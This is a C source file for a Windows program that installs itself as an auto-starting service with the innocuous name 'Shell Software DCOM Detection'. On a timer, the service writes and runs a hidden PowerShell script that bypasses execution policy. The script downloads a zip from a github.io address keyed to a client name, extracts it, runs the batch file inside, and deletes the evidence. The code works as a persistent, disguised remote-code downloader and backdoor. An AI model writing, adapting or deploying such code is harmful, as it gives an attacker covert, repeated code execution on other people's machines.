#include "main.h"

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
  
void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);
int InitService();

const char* getFileNameFromPath(const char* path)
{
	char separator = '\\';
	if(path != NULL)
	{
		for(size_t i = strlen(path);  i > 0; --i)
		{
			if (path[i-1] == separator)
			{
				return &path[i];
			}
		}
	}
	return path;
}

char* getDirPathFromPath(char* path)
{
	char* parent = NULL;
    int parentLen;
    char* last = strrchr(path, '\\');

    if (last != NULL)
	{
		parentLen = strlen(path) - strlen(last + 1);
		parent = (char*)malloc(parentLen * sizeof(char));
        strncpy(parent, path, parentLen);
		parent[parentLen] = 0;
    }
	return parent;
}

char* exepath = NULL;
int timer = 0;
char* clientName = NULL;

int WriteToLog(char* str)
{
	UNUSED(str);
	/* if (exepath == NULL)
		return -1;
	char* logName = (char*)malloc((strlen(exepath)+8) * sizeof(char));
	strcpy(logName, exepath);
	strcat(logName, "log.txt");
    FILE* log;
    log = fopen(logName, "a+");
	free(logName);
    if (log == NULL)
        return -1;
    fprintf(log, "%s\n", str);
    fclose(log); */
    return 0;
}

void CronFunc(void)
{
	if (clientName == NULL)
		return;
	
	char* cmdx = (char*)malloc(5024 * sizeof(char));
	sprintf(cmdx, "cmd /c echo $client = \"%s\"> %%tmp%%\\tmp.ps1 &&\
 echo $zip_ext_folder = $env:TEMP>> %%tmp%%\\tmp.ps1 &&\
 echo $out_folder = $env:TEMP>> %%tmp%%\\tmp.ps1 &&\
 echo $file = \"index.zip\">> %%tmp%%\\tmp.ps1 &&\
 echo $infile = \"https://suncomputers2021.github.io/smsbox/\" + $client + \"/\" + $file>> %%tmp%%\\tmp.ps1 &&\
 echo $outfile = $out_folder + \"\\\\\" + $file>> %%tmp%%\\tmp.ps1 &&\
 echo $exefile = $zip_ext_folder + \"\\\\\" + \"index.bat\">> %%tmp%%\\tmp.ps1 &&\
 echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3>> %%tmp%%\\tmp.ps1 &&\
 echo [Net.ServicePointManager]::SecurityProtocol = \"Tls, Tls11, Tls12, Ssl3\">> %%tmp%%\\tmp.ps1 &&\
 echo $ProgressPreference = 'SilentlyContinue'>> %%tmp%%\\tmp.ps1 &&\
 echo Invoke-WebRequest -Uri $infile -OutFile $outfile>> %%tmp%%\\tmp.ps1 &&\
 echo $ProgressPreference = 'Continue'>> %%tmp%%\\tmp.ps1 &&\
 echo Expand-Archive -LiteralPath $outfile -DestinationPath $zip_ext_folder -Force>> %%tmp%%\\tmp.ps1 &&\
 echo Remove-item $outfile>> %%tmp%%\\tmp.ps1 &&\
 echo $response = ^& $exefile>> %%tmp%%\\tmp.ps1 &&\
 echo Write-Host $response>> %%tmp%%\\tmp.ps1 &&\
 echo Remove-item $exefile>> %%tmp%%\\tmp.ps1 &&\
 PowerShell -NoProfile -ExecutionPolicy Bypass -NoLogo -WindowStyle Hidden -Command \"& '%%tmp%%\\tmp.ps1'\" &&\
 del %%tmp%%\\tmp.ps1", clientName);
	char *result = exe_cmd(cmdx);
	free(cmdx);
	free(result);
}

int main(int argc, char *argv[])
{
	exepath = getDirPathFromPath(argv[0]);
	//char* fileName = (char*)getFileNameFromPath(argv[0]);
	//char* ext = strstr(fileName, ".exe");
	//if (ext)
	//{
		//fileName[strlen(fileName) - 4] = 0;
	//}
	char* fileName = "RRunCShell";
	char* srvName = "Shell Software DCOM Detection";
	char* srvDesc = "Shell Software DCOM Detection";
	
	if (argc == 2 && strcmp(argv[1], "ini") == 0)
	{
		char* iniName = (char*)malloc((strlen(fileName)+5) * sizeof(char));
		strcpy(iniName, fileName);
		strcat(iniName, ".ini");
		if( access( iniName, F_OK ) == -1)
		{
			ini_t* ini = ini_create(NULL);
			int section = ini_section_add( ini, fileName, strlen(fileName) );
			ini_property_add( ini, section, "CronTab", 7, "60", 2 );
			ini_property_add( ini, section, "Client", 6, "sunclient", 9 );
			ini_property_add( ini, section, "Enable", 6, "True", 4 );

			int size = ini_save( ini, NULL, 0 ); // Find the size needed
			char* data = (char*) malloc( size );
			size = ini_save( ini, data, size ); // Actually save the file
			ini_destroy( ini );

			FILE* fp = fopen( iniName, "w" );
			fwrite( data, 1, size, fp );
			fclose( fp );
			free( data );
		}
		free(iniName);
		return EXIT_SUCCESS;
	}
	
	char* cmd = (char*)malloc(1024 * sizeof(char));
	sprintf(cmd, "cmd /c sc query | find /I /C \"%s\"", srvName);
	char *hasSrv = exe_cmd(cmd);
	free(cmd);
	char* ret = strstr(hasSrv, "0");
	int isInst = (ret) ? 0 : 1;
	free(hasSrv);
	if (isInst == 0)
	{
		cmd = (char*)malloc(1024 * sizeof(char));
		sprintf(cmd, "cmd /c sc create \"%s\" binPath= \"%s srv\" DisplayName= \"%s \" start= auto", srvName, argv[0], srvName);
		char *result = exe_cmd(cmd);
		free(cmd);
		free(result);
		
		cmd = (char*)malloc(1024 * sizeof(char));
		sprintf(cmd, "cmd /c sc description \"%s\" \"%s\"", srvName, srvDesc);
		result = exe_cmd(cmd);
		free(cmd);
		free(result);
		
		cmd = (char*)malloc(1024 * sizeof(char));
		sprintf(cmd, "cmd /c sc failure \"%s\" actions= restart/60000/restart/60000/restart/60000// reset= 86400", srvName);
		result = exe_cmd(cmd);
		free(cmd);
		free(result);
		
		cmd = (char*)malloc(1024 * sizeof(char));
		sprintf(cmd, "cmd /c sc start \"%s\"", srvName);
		result = exe_cmd(cmd);
		free(cmd);
		free(result);
	}
	else if (argc == 2 && strcmp(argv[1], "uninstall") == 0)
	{
		if (isInst == 1)
		{
			cmd = (char*)malloc(1024 * sizeof(char));
			sprintf(cmd, "cmd /c sc stop \"%s\"", srvName);
			char *result = exe_cmd(cmd);
			free(cmd);
			free(result);
			
			cmd = (char*)malloc(1024 * sizeof(char));
			sprintf(cmd, "cmd /c sc delete \"%s\"", srvName);
			result = exe_cmd(cmd);
			free(cmd);
			free(result);
		}
	}
	else if (argc == 2 && strcmp(argv[1], "srv") == 0)
	{
		SERVICE_TABLE_ENTRY ServiceTable[2];
		ServiceTable[0].lpServiceName = (char*)srvName;
		ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
		ServiceTable[1].lpServiceName = NULL;
		ServiceTable[1].lpServiceProc = NULL;
		// Start the control dispatcher thread for our service
		StartServiceCtrlDispatcher(ServiceTable);
	}
	
	if (exepath != NULL)
	{
		free(exepath);
	}
	
	if (clientName != NULL)
	{
		free(clientName);
	}
	
	return EXIT_SUCCESS;
}

void ServiceMain(int argc, char** argv)
{
	int error;
	
	ServiceStatus.dwServiceType        = SERVICE_WIN32;
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint         = 0;
    ServiceStatus.dwWaitHint           = 0;
	
	hStatus = RegisterServiceCtrlHandler(
        "SleepService",
        (LPHANDLER_FUNCTION)ControlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)0)
	{ 
		// Registering Control Handler failed
		return;
    }
    // Initialize Service
    error = InitService();
    if (error)
    {
		// Initialization failed
		ServiceStatus.dwCurrentState       = SERVICE_STOPPED;
        ServiceStatus.dwWin32ExitCode      = -1;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;
    }
    // We report the running status to SCM.
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus (hStatus, &ServiceStatus);

    // The worker loop of a service
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        /* Do nothing but loop once every 5 minutes */
        while(1)
        {
			if (timer == 0)
			{
				//const char* fileName = argv[0];
				char* fileName = "RRunCShell";
				int isSleep = 0;
				char* iniName = (char*)malloc((strlen(exepath)+strlen(fileName)+5) * sizeof(char));
				strcpy(iniName, exepath);
				strcat(iniName, fileName);
				strcat(iniName, ".ini");
				if( access( iniName, F_OK ) != -1)
				{
					FILE* fp = fopen( iniName, "r" );
					fseek( fp, 0, SEEK_END );
					int size = ftell( fp );
					fseek( fp, 0, SEEK_SET );
					char* data = (char*) malloc( size + 1 );
					fread( data, 1, size, fp );
					data[ size ] = '\0';
					fclose( fp );
					ini_t* ini = ini_load( data, NULL );
					free( data );
					
					int section, idx_c, idx_cn, idx_e;
					section = ini_find_section( ini, fileName, strlen(fileName) );
					if (section != INI_NOT_FOUND)
					{
						idx_c = ini_find_property( ini, section, "CronTab", 7 );
						idx_cn = ini_find_property( ini, section, "Client", 6 );
						idx_e = ini_find_property( ini, section, "Enable", 6 );
						if (idx_c != INI_NOT_FOUND && idx_cn != INI_NOT_FOUND && idx_e != INI_NOT_FOUND)
						{
							char const* CronTab = ini_property_value( ini, section, idx_c );
							char const* Client = ini_property_value( ini, section, idx_cn );
							char const* Enable = ini_property_value( ini, section, idx_e );
							if (strcmp(Enable, "True") == 0 && clientName == NULL)
							{
								clientName = (char*)malloc((strlen(Client)+1) * sizeof(char));
								strcpy(clientName, Client);
								int t = atoi(CronTab);
								if (t > 0)
								{
									timer = t;
								}
							}
							else
							{
								isSleep = 1;
							}
						}
						else
						{
							isSleep = 1;
						}
					}
					else
					{
						isSleep = 1;
					}
					
					ini_destroy( ini );
				}
				else
				{
					isSleep = 1;
				}
				free(iniName);
				
				if (isSleep == 1)
				{
					sleep(60);
				}
			}
			else
			{
				sleep(timer);
				CronFunc();
			}
        }
    }
	
	(void)argc;
	(void)*argv;
	
    return;
}
  
// Service initialization
int InitService()
{
    int result;
    result = WriteToLog("Monitoring started.");
    return(result);
}

// Control handler function
void ControlHandler(DWORD request)
{
    switch(request)
    {
        case SERVICE_CONTROL_STOP:
			WriteToLog("Monitoring stopped.");
 
			ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        case SERVICE_CONTROL_SHUTDOWN:
            WriteToLog("Monitoring stopped.");
 
			ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        default:
			break;
	}

    // Report current status
    SetServiceStatus (hStatus,  &ServiceStatus);

    return;
}